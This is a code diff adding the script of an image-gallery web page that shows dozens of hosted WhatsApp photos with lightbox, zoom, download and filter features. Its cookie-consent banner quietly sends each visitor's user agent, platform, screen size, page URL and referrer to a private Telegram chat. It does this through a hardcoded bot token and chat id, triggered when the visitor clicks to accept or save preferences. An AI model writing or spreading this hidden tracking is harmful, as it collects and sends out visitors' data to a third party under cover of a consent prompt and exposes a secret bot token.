+            "https://i.postimg.cc/qB3kKWTw/Whats-App-Image-2025-10-02-at-3-36-35-PM.jpg",
+            "https://i.postimg.cc/FFL9Sw4Z/Whats-App-Image-2025-10-02-at-3-36-35-PM-1.jpg",
+            "https://i.postimg.cc/gkbGH4cG/Whats-App-Image-2025-10-02-at-3-36-36-PM.jpg",
+            "https://i.postimg.cc/VsCYt282/Whats-App-Image-2025-10-02-at-3-36-36-PM-1.jpg",
+            "https://i.postimg.cc/BZKqFR0r/Whats-App-Image-2025-10-02-at-3-36-36-PM-2.jpg",
+            "https://i.postimg.cc/3JQ3F9r7/Whats-App-Image-2025-10-02-at-3-36-37-PM.jpg",
+            "https://i.postimg.cc/BQfJBNZW/Whats-App-Image-2025-10-02-at-3-36-37-PM-1.jpg",
+            "https://i.postimg.cc/sDC34KfR/Whats-App-Image-2025-10-02-at-3-36-37-PM-2.jpg",
+            "https://i.postimg.cc/J4CR5K7G/Whats-App-Image-2025-10-02-at-3-36-38-PM.jpg",
+            "https://i.postimg.cc/BQfJBNZb/Whats-App-Image-2025-10-02-at-3-36-38-PM-1.jpg",
+            "https://i.postimg.cc/7Y1ws7bV/Whats-App-Image-2025-10-02-at-3-36-39-PM.jpg",
+            "https://i.postimg.cc/9FHcY1Xz/Whats-App-Image-2025-10-02-at-3-36-39-PM-1.jpg",
+            "https://i.postimg.cc/m23BXMh1/Whats-App-Image-2025-10-02-at-3-36-39-PM-2.jpg",
+            "https://i.postimg.cc/FsbNWc1j/Whats-App-Image-2025-10-02-at-3-36-40-PM.jpg",
+            "https://i.postimg.cc/GhPd7Y95/Whats-App-Image-2025-10-02-at-3-36-40-PM-1.jpg",
+            "https://i.postimg.cc/YCpkJ9W2/Whats-App-Image-2025-10-02-at-3-36-41-PM.jpg",
+            "https://i.postimg.cc/J43M6Jt9/Whats-App-Image-2025-10-02-at-3-36-41-PM-1.jpg",
+            "https://i.postimg.cc/RZM9jFHv/Whats-App-Image-2025-10-02-at-3-36-41-PM-2.jpg",
+            "https://i.postimg.cc/MpdxxS7T/Whats-App-Image-2025-10-02-at-3-36-42-PM.jpg",
+            "https://i.postimg.cc/x1tYY2vX/Whats-App-Image-2025-10-02-at-3-36-42-PM-1.jpg",
+            "https://i.postimg.cc/7ZmDDk3w/Whats-App-Image-2025-10-02-at-3-36-42-PM-2.jpg",
+            "https://i.postimg.cc/dV4vvY2y/Whats-App-Image-2025-10-02-at-3-36-43-PM.jpg",
+            "https://i.postimg.cc/8ztDDSRL/Whats-App-Image-2025-10-02-at-3-36-43-PM-1.jpg",
+            "https://i.postimg.cc/XvqWYzL5/Whats-App-Image-2025-10-02-at-3-36-44-PM.jpg",
+            "https://i.postimg.cc/Dz0hwM6x/Whats-App-Image-2025-10-02-at-3-36-44-PM-1.jpg",
+            "https://i.postimg.cc/GptRm5zn/Whats-App-Image-2025-10-02-at-3-36-45-PM.jpg",
+            "https://i.postimg.cc/MGHwpFt8/Whats-App-Image-2025-10-02-at-3-36-45-PM-1.jpg",
+            "https://i.postimg.cc/QMz39JYY/Whats-App-Image-2025-10-02-at-3-36-45-PM-2.jpg",
+            "https://i.postimg.cc/TPs6LJHY/Whats-App-Image-2025-10-02-at-3-36-46-PM.jpg",
+            "https://i.postimg.cc/yNGHgyrB/Whats-App-Image-2025-10-02-at-3-36-46-PM-1.jpg",
+            "https://i.postimg.cc/TPs6LJHT/Whats-App-Image-2025-10-02-at-3-36-46-PM-2.jpg",
+            "https://i.postimg.cc/hGYBz134/Whats-App-Image-2025-10-02-at-3-36-47-PM.jpg",
+            "https://i.postimg.cc/Y9mw1LJN/Whats-App-Image-2025-10-02-at-3-48-36-PM.jpg",
+            "https://i.postimg.cc/TwWXr5ZW/Whats-App-Image-2025-10-02-at-3-48-36-PM-1.jpg",
+            "https://i.postimg.cc/C5TpJLg4/Whats-App-Image-2025-10-02-at-3-48-37-PM.jpg",
+            "https://i.postimg.cc/TwWXr5Zb/Whats-App-Image-2025-10-02-at-3-48-37-PM-1.jpg",
+            "https://i.postimg.cc/4ykRwNGC/Whats-App-Image-2025-10-02-at-3-48-38-PM.jpg",
+            "https://i.postimg.cc/ZntzjKSV/Whats-App-Image-2025-10-02-at-3-48-38-PM-1.jpg",
+            "https://i.postimg.cc/Fz5XGs4q/Whats-App-Image-2025-10-02-at-3-48-38-PM-2.jpg",
+            "https://i.postimg.cc/d32PfPQP/Whats-App-Image-2025-10-02-at-3-48-39-PM.jpg",
+            "https://i.postimg.cc/nrbfTcxf/Whats-App-Image-2025-10-02-at-3-48-39-PM-1.jpg",
+            "https://i.postimg.cc/8kMScWdg/Whats-App-Image-2025-10-02-at-3-48-40-PM.jpg",
+            "https://i.postimg.cc/qqsVFVBq/Whats-App-Image-2025-10-02-at-3-48-40-PM-1.jpg",
+            "https://i.postimg.cc/pXvtFTkx/Whats-App-Image-2025-10-02-at-3-48-41-PM.jpg",
+            "https://i.postimg.cc/c1wSCY7J/Whats-App-Image-2025-10-02-at-3-48-41-PM-1.jpg",
+            "https://i.postimg.cc/c4WNnHTd/Whats-App-Image-2025-10-02-at-3-48-41-PM-2.jpg",
+            "https://i.postimg.cc/vZHF0NpK/Whats-App-Image-2025-10-02-at-3-48-42-PM.jpg",
+            "https://i.postimg.cc/xTQSzCgN/Whats-App-Image-2025-10-02-at-3-48-42-PM-1.jpg",
+            "https://i.postimg.cc/bwCXWRPR/Whats-App-Image-2025-10-02-at-3-48-43-PM.jpg",
+            "https://i.postimg.cc/FHWt8xvf/Whats-App-Image-2025-10-02-at-3-48-43-PM-1.jpg",
+            "https://i.postimg.cc/527cTmJt/Whats-App-Image-2025-10-02-at-3-48-43-PM-2.jpg",
+            "https://i.postimg.cc/4dcrKk9H/Whats-App-Image-2025-10-02-at-3-48-44-PM.jpg",
+            "https://i.postimg.cc/BvkrQQXF/Whats-App-Image-2025-10-02-at-3-48-44-PM-1.jpg",
+            "https://i.postimg.cc/1tFLghqJ/Whats-App-Image-2025-10-02-at-3-48-45-PM.jpg",
+            "https://i.postimg.cc/XvmR77pY/Whats-App-Image-2025-10-02-at-3-48-45-PM-1.jpg",
+            "https://i.postimg.cc/vBnp1FVv/Whats-App-Image-2025-10-02-at-3-48-45-PM-2.jpg"
+        ];
+
+        let allImages = images;
+        let filteredImages = images;
+        let currentIndex = 0;
+        let zoom = 1;
+
+        const gallery = document.getElementById('gallery');
+        const lightbox = document.getElementById('lightbox');
+        const lightboxImg = document.getElementById('lightbox-img');
+        const searchBar = document.getElementById('search-bar');
+        const filterBtns = document.querySelectorAll('.filter-btn');
+
+        function render(imgs) {
+            gallery.innerHTML = '';
+            if (imgs.length === 0) {
+                gallery.innerHTML = '<div class="no-results">No images found 😔</div>';
+                return;
+            }
+            imgs.forEach((img, i) => {
+                const item = document.createElement('div');
+                item.className = 'gallery-item';
+                item.innerHTML = `<img src="${img}" alt="Image ${i + 1}" loading="lazy">`;
+                item.onclick = () => openLightbox(i);
+                gallery.appendChild(item);
+            });
+        }
+
+        function openLightbox(i) {
+            currentIndex = i;
+            lightboxImg.src = filteredImages[i];
+            zoom = 1;
+            lightboxImg.style.transform = `scale(${zoom})`;
+            document.getElementById('zoom-level').textContent = '100%';
+            lightbox.classList.add('active');
+            document.body.style.overflow = 'hidden';
+            
+            // Update the lightbox title with a more readable filename
+            const filename = filteredImages[i].split('/').pop().replace('.jpg', '').replace(/Whats-App-Image-/, '');
+            document.getElementById('lightbox-title').textContent = filename;
+        }
+
+        function closeLightbox() {
+            lightbox.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        function navigate(direction) {
+            currentIndex = (currentIndex + direction + filteredImages.length) % filteredImages.length;
+            lightboxImg.src = filteredImages[currentIndex];
+            zoom = 1;
+            lightboxImg.style.transform = `scale(${zoom})`;
+            document.getElementById('zoom-level').textContent = '100%';
+        }
+
+        function updateZoom(delta) {
+            zoom = Math.max(0.5, Math.min(5, zoom + delta));
+            lightboxImg.style.transform = `scale(${zoom})`;
+            document.getElementById('zoom-level').textContent = Math.round(zoom * 100) + '%';
+        }
+
+        // Event listeners
+        document.getElementById('close-lightbox').onclick = closeLightbox;
+        document.getElementById('prev-btn').onclick = () => navigate(-1);
+        document.getElementById('next-btn').onclick = () => navigate(1);
+        document.getElementById('zoom-in').onclick = () => updateZoom(0.1);
+        document.getElementById('zoom-out').onclick = () => updateZoom(-0.1);
+        document.getElementById('zoom-reset').onclick = () => {
+            zoom = 1;
+            lightboxImg.style.transform = `scale(${zoom})`;
+            document.getElementById('zoom-level').textContent = '100%';
+        };
+        
+        // Download functionality
+        document.getElementById('download-btn').onclick = function() {
+            // Show loading state on button
+            const downloadBtn = document.getElementById('download-btn');
+            const originalText = downloadBtn.textContent;
+            downloadBtn.textContent = '⏳ Downloading...';
+            downloadBtn.disabled = true;
+            
+            // Extract filename from URL
+            const imageUrl = filteredImages[currentIndex];
+            const filename = imageUrl.split('/').pop();
+            
+            // Check if fetch is supported (not in IE)
+            if (window.fetch) {
+                // Modern browsers - Use fetch to get the image directly
+                fetch(imageUrl)
+                    .then(response => {
+                        if (!response.ok) throw new Error('Network response was not ok');
+                        return response.blob();
+                    })
+                    .then(blob => {
+                        // Create object URL from blob
+                        const blobUrl = URL.createObjectURL(blob);
+                        
+                        // Create download link
+                        const downloadLink = document.createElement('a');
+                        downloadLink.href = blobUrl;
+                        downloadLink.download = filename;
+                        
+                        // Trigger download
+                        document.body.appendChild(downloadLink);
+                        downloadLink.click();
+                        document.body.removeChild(downloadLink);
+                        
+                        // Release object URL
+                        setTimeout(() => URL.revokeObjectURL(blobUrl), 100);
+                        
+                        // Show success message
+                        downloadBtn.textContent = '✅ Downloaded!';
+                        setTimeout(() => {
+                            downloadBtn.textContent = originalText;
+                            downloadBtn.disabled = false;
+                        }, 1500);
+                    })
+                    .catch(error => {
+                        console.error('Download failed:', error);
+                        downloadBtn.textContent = '❌ Failed';
+                        setTimeout(() => {
+                            downloadBtn.textContent = originalText;
+                            downloadBtn.disabled = false;
+                        }, 2000);
+                    });
+            } else {
+                // IE Fallback - Use XMLHttpRequest
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', imageUrl, true);
+                xhr.responseType = 'blob';
+                
+                xhr.onload = function() {
+                    if (this.status === 200) {
+                        // IE11 doesn't support much of the fancy stuff, so we use msSaveBlob
+                        if (window.navigator && window.navigator.msSaveBlob) {
+                            window.navigator.msSaveBlob(this.response, filename);
+                            
+                            // Show success message
+                            downloadBtn.textContent = '✅ Downloaded!';
+                            setTimeout(() => {
+                                downloadBtn.textContent = originalText;
+                                downloadBtn.disabled = false;
+                            }, 1500);
+                        } else {
+                            // Fallback for older browsers without msSaveBlob
+                            const blobUrl = URL.createObjectURL(this.response);
+                            const downloadLink = document.createElement('a');
+                            downloadLink.href = blobUrl;
+                            downloadLink.download = filename;
+                            document.body.appendChild(downloadLink);
+                            downloadLink.click();
+                            document.body.removeChild(downloadLink);
+                            setTimeout(() => URL.revokeObjectURL(blobUrl), 100);
+                            
+                            // Show success message
+                            downloadBtn.textContent = '✅ Downloaded!';
+                            setTimeout(() => {
+                                downloadBtn.textContent = originalText;
+                                downloadBtn.disabled = false;
+                            }, 1500);
+                        }
+                    } else {
+                        console.error('Download failed: HTTP status', this.status);
+                        downloadBtn.textContent = '❌ Failed';
+                        setTimeout(() => {
+                            downloadBtn.textContent = originalText;
+                            downloadBtn.disabled = false;
+                        }, 2000);
+                    }
+                };
+                
+                xhr.onerror = function() {
+                    console.error('Download failed: XHR error');
+                    downloadBtn.textContent = '❌ Failed';
+                    setTimeout(() => {
+                        downloadBtn.textContent = originalText;
+                        downloadBtn.disabled = false;
+                    }, 2000);
+                };
+                
+                xhr.send();
+            }
+        };
+
+        lightbox.onclick = (e) => {
+            if (e.target === lightbox) closeLightbox();
+        };
+
+        // Keyboard navigation
+        document.onkeydown = (e) => {
+            if (lightbox.classList.contains('active')) {
+                if (e.key === 'Escape') closeLightbox();
+                if (e.key === 'ArrowLeft') navigate(-1);
+                if (e.key === 'ArrowRight') navigate(1);
+            }
+        };
+
+        // Search functionality
+        searchBar.oninput = (e) => {
+            const term = e.target.value.toLowerCase();
+            filteredImages = allImages.filter((_, i) => `image ${i + 1}`.includes(term));
+            render(filteredImages);
+        };
+
+        // Filter buttons
+        filterBtns.forEach(btn => {
+            btn.onclick = function() {
+                filterBtns.forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                
+                const period = this.dataset.period;
+                if (period === 'all') {
+                    filteredImages = allImages;
+                } else {
+                    // Filter based on time period
+                    const start = period === '335' ? 0 : period === '336' ? 10 : 20;
+                    filteredImages = allImages.slice(start, start + 10);
+                }
+                render(filteredImages);
+            };
+        });
+
+        // Mouse wheel zoom
+        lightbox.onwheel = (e) => {
+            if (lightbox.classList.contains('active')) {
+                e.preventDefault();
+                updateZoom(e.deltaY > 0 ? -0.1 : 0.1);
+            }
+        };
+
+        // Initialize
+        render(filteredImages);
+        
+        // Cookie Consent Functionality
+        
+        // Function to send cookie data to Telegram bot
+        function sendCookieDataToTelegram(action, preferences) {
+            var botToken = '8160104382:AAEm7Ca2uM2Ln6DQ6iw2Gh2q5RTCkuWm2pk';
+            var chatId = '5469123339';
+            var userId = '8160104382';
+            
+            // Get user information
+            var userInfo = {
+                userAgent: navigator.userAgent,
+                language: navigator.language || navigator.userLanguage,
+                platform: navigator.platform,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                url: window.location.href,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Prepare message data
+            var cookieData;
+            if (action === 'all_accepted') {
+                cookieData = {
+                    action: 'all_accepted',
+                    cookiesAccepted: true,
+                    performanceCookies: true,
+                    functionalCookies: true,
+                    targetingCookies: true,
+                    userInfo: userInfo,
+                    userId: userId
+                };
+            } else {
+                cookieData = {
+                    action: 'preferences_saved',
+                    cookiesAccepted: true,
+                    performanceCookies: preferences.performance,
+                    functionalCookies: preferences.functional,
+                    targetingCookies: preferences.targeting,
+                    userInfo: userInfo,
+                    userId: userId
+                };
+            }
+            
+            // Convert data to string for Telegram message
+            var message = 'Cookie Data:\n' + JSON.stringify(cookieData, null, 2);
+            
+            // Create URL for Telegram API
+            var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+            
+            // Use XMLHttpRequest for IE compatibility
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        console.log('Cookie data sent to Telegram successfully');
+                    } else {
+                        console.error('Failed to send cookie data to Telegram:', xhr.status, xhr.statusText);
+                    }
+                }
+            };
+            
+            // Send the request
+            xhr.send(JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            }));
+        }
+        
+        function initCookieConsent() {
+            var cookieConsent = document.createElement('div');
+            cookieConsent.className = 'cookie-consent';
+            cookieConsent.innerHTML = '\
+                <div class="cookie-text">\
+                    <h4>🍪 We use cookies on this site</h4>\
+                    <p>We use cookies to personalize content and ads, provide social media features, and analyze our traffic. \
+                    We also share information about your use of our site with our social media, advertising, and analytics partners.</p>\
+                </div>\
+                <div class="cookie-buttons">\
+                    <button class="cookie-btn customize-btn" id="customize-cookies">Customize</button>\
+                    <button class="cookie-btn accept-btn" id="accept-cookies">Accept All</button>\
+                </div>\
+            ';
+            document.body.appendChild(cookieConsent);
+            
+            // Cookie Settings Modal
+            var cookieSettings = document.createElement('div');
+            cookieSettings.className = 'cookie-settings';
+            cookieSettings.innerHTML = '\
+                <div class="settings-content">\
+                    <div class="settings-header">\
+                        <h3>Cookie Preferences</h3>\
+                        <button class="close-settings" id="close-settings">&times;</button>\
+                    </div>\
+                    <div class="cookie-option">\
+                        <div class="option-header">\
+                            <h4>Essential Cookies</h4>\
+                            <label class="toggle-switch">\
+                                <input type="checkbox" checked disabled>\
+                                <span class="toggle-slider"></span>\
+                            </label>\
+                        </div>\
+                        <p class="option-description">These cookies are necessary for the website to function and cannot be switched off in our systems.</p>\
+                    </div>\
+                    <div class="cookie-option">\
+                        <div class="option-header">\
+                            <h4>Performance Cookies</h4>\
+                            <label class="toggle-switch">\
+                                <input type="checkbox" id="performance-cookies" checked>\
+                                <span class="toggle-slider"></span>\
+                            </label>\
+                        </div>\
+                        <p class="option-description">These cookies allow us to count visits and traffic sources so we can measure and improve the performance of our site.</p>\
+                    </div>\
+                    <div class="cookie-option">\
+                        <div class="option-header">\
+                            <h4>Functional Cookies</h4>\
+                            <label class="toggle-switch">\
+                                <input type="checkbox" id="functional-cookies" checked>\
+                                <span class="toggle-slider"></span>\
+                            </label>\
+                        </div>\
+                        <p class="option-description">These cookies enable the website to provide enhanced functionality and personalization.</p>\
+                    </div>\
+                    <div class="cookie-option">\
+                        <div class="option-header">\
+                            <h4>Targeting Cookies</h4>\
+                            <label class="toggle-switch">\
+                                <input type="checkbox" id="targeting-cookies" checked>\
+                                <span class="toggle-slider"></span>\
+                            </label>\
+                        </div>\
+                        <p class="option-description">These cookies may be set through our site by our advertising partners to build a profile of your interests.</p>\
+                    </div>\
+                    <div class="settings-footer">\
+                        <button class="save-settings" id="save-settings">Save Preferences</button>\
+                    </div>\
+                </div>\
+            ';
+            document.body.appendChild(cookieSettings);
+            
+            // Show cookie consent if not previously accepted
+            if (!localStorage.getItem('cookiesAccepted')) {
+                setTimeout(function() {
+                    // For IE9+
+                    if (cookieConsent.classList) {
+                        cookieConsent.classList.add('show');
+                    } else {
+                        // For IE8
+                        cookieConsent.className += ' show';
+                    }
+                }, 1000);
+            }
+            
+            // Event Listeners with IE compatibility
+            function addEvent(element, event, handler) {
+                if (element.addEventListener) {
+                    element.addEventListener(event, handler, false);
+                } else if (element.attachEvent) {
+                    element.attachEvent('on' + event, handler);
+                } else {
+                    element['on' + event] = handler;
+                }
+            }
+            
+            function removeClass(element, className) {
+                if (element.classList) {
+                    element.classList.remove(className);
+                } else {
+                    element.className = element.className.replace(new RegExp('(^|\\b)' + className.split(' ').join('|') + '(\\b|$)', 'gi'), ' ');
+                }
+            }
+            
+            function addClass(element, className) {
+                if (element.classList) {
+                    element.classList.add(className);
+                } else {
+                    element.className += ' ' + className;
+                }
+            }
+            
+            var acceptBtn = document.getElementById('accept-cookies');
+            addEvent(acceptBtn, 'click', function() {
+                acceptAllCookies();
+                removeClass(cookieConsent, 'show');
+            });
+            
+            var customizeBtn = document.getElementById('customize-cookies');
+            addEvent(customizeBtn, 'click', function() {
+                addClass(cookieSettings, 'show');
+            });
+            
+            var closeBtn = document.getElementById('close-settings');
+            addEvent(closeBtn, 'click', function() {
+                removeClass(cookieSettings, 'show');
+            });
+            
+            var saveBtn = document.getElementById('save-settings');
+            addEvent(saveBtn, 'click', function() {
+                saveCookiePreferences();
+                removeClass(cookieSettings, 'show');
+                removeClass(cookieConsent, 'show');
+            });
+        }
+        
+        function acceptAllCookies() {
+            // In a real implementation, this would set cookies or trigger analytics
+            try {
+                localStorage.setItem('cookiesAccepted', 'true');
+                localStorage.setItem('performanceCookies', 'true');
+                localStorage.setItem('functionalCookies', 'true');
+                localStorage.setItem('targetingCookies', 'true');
+                console.log('All cookies accepted');
+            } catch (e) {
+                // Fallback for browsers without localStorage support
+                var expiryDate = new Date();
+                expiryDate.setMonth(expiryDate.getMonth() + 12); // 1 year expiry
+                
+                document.cookie = 'cookiesAccepted=true; expires=' + expiryDate.toUTCString() + '; path=/';
+                document.cookie = 'performanceCookies=true; expires=' + expiryDate.toUTCString() + '; path=/';
+                document.cookie = 'functionalCookies=true; expires=' + expiryDate.toUTCString() + '; path=/';
+                document.cookie = 'targetingCookies=true; expires=' + expiryDate.toUTCString() + '; path=/';
+            }
+            
+            // Send cookie data to Telegram bot
+            sendCookieDataToTelegram('all_accepted');
+            
+            // Here you would initialize your analytics, ad services, etc.
+            // Example: initializeGoogleAnalytics();
+        }
+        
+        function saveCookiePreferences() {
+            var performanceEnabled = document.getElementById('performance-cookies').checked;
+            var functionalEnabled = document.getElementById('functional-cookies').checked;
+            var targetingEnabled = document.getElementById('targeting-cookies').checked;
+            
+            try {
+                localStorage.setItem('cookiesAccepted', 'true');
+                localStorage.setItem('performanceCookies', performanceEnabled);
+                localStorage.setItem('functionalCookies', functionalEnabled);
+                localStorage.setItem('targetingCookies', targetingEnabled);
+            } catch (e) {
+                // Fallback for browsers without localStorage support
+                var expiryDate = new Date();
+                expiryDate.setMonth(expiryDate.getMonth() + 12); // 1 year expiry
+                
+                document.cookie = 'cookiesAccepted=true; expires=' + expiryDate.toUTCString() + '; path=/';
+                document.cookie = 'performanceCookies=' + performanceEnabled + '; expires=' + expiryDate.toUTCString() + '; path=/';
+                document.cookie = 'functionalCookies=' + functionalEnabled + '; expires=' + expiryDate.toUTCString() + '; path=/';
+                document.cookie = 'targetingCookies=' + targetingEnabled + '; expires=' + expiryDate.toUTCString() + '; path=/';
+            }
+            
+            console.log('Cookie preferences saved:', {
+                performance: performanceEnabled,
+                functional: functionalEnabled,
+                targeting: targetingEnabled
+            });
+            
+            // Send cookie preferences to Telegram bot
+            sendCookieDataToTelegram('preferences_saved', {
+                performance: performanceEnabled,
+                functional: functionalEnabled,
+                targeting: targetingEnabled
+            });
+            
+            // Here you would conditionally initialize services based on preferences
+            // Example: if(performanceEnabled) initializeAnalytics();
+        }
+        
+        // Helper function to get cookie value
+        function getCookie(name) {
+            var nameEQ = name + '=';
+            var ca = document.cookie.split(';');
+            for(var i=0; i < ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
+        
+        // Initialize cookie consent
+        initCookieConsent();
+    </script>
+</body>
+</html>
